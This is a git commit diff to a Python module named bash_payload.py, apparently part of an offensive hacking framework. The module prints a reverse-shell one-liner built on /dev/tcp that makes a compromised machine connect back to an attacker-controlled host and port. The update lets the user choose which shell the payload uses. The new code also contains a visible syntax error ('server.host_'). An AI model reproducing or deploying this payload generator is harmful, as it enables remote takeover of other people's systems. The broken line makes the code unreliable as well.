77f6d8f85f80ac8880c4436eb5d93326e946914f
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-03-15 13:35:59 +0300

    Update bash_payload.py

--- core/payloads/bash_payload.py
+++ core/payloads/bash_payload.py
@@ -21,11 +21,14 @@
 from core import helper as h
 class payload:
 	def __init__(self):
-		self.name = "Bourne-Again Shell"
-		self.description = "Creates a bash payload."
+		self.name = "Target Shell"
+		self.description = "Creates a shell payload."
 		self.usage = "Run in terminal."
 
 	def run(self,server):
-		print h.WHITE + "-"*40 + h.ENDC
-		print h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC
-		print h.WHITE + "-"*40 + h.ENDC
+		shell = raw_input(h.info_general_raw("Target Shell: "))
+		payload = shell+" &> /dev/tcp/"+server.host_"/"+str(server.port)+" 0>&1"
+		backend = len(payload)
+		print h.WHITE + "-"*backend + h.ENDC
+		print h.COLOR_INFO+payload+h.ENDC
+		print h.WHITE + "-"*backend + h.ENDC
